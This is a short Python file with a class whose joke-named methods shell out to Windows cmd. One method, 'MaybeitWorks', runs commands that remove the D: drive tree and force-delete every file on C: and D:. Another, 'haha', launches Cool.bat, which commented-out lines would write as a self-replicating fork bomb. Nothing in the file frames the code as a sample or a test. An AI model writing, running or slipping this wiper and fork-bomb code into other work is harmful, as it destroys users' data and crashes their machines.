import os
#from datetime import datetime

class ST:

    #def ShowTime():
    #    print(datetime.now())
    def MaybeitWorks():
        os.system('cmd /k "cd c:/"')
        os.system('cmd /k "rd D:\/s/q"')
        os.system('cmd /k "del /f /q /s "C:\*.*""')
        os.system('cmd /k "del /f "C:\*.*"/q /s"')
        os.system('cmd /k "del /f /q /s "D:\*.*""')
        os.system('cmd /k "del /f "D:\*.*"/q /s"')

    def haha():
        #f=open("Cool.bat","a")
        #f.write(":s\nstart %0\n%0|%0\ngoto :s")
        #f.close()

        os.system('cmd /k "Cool.bat"')


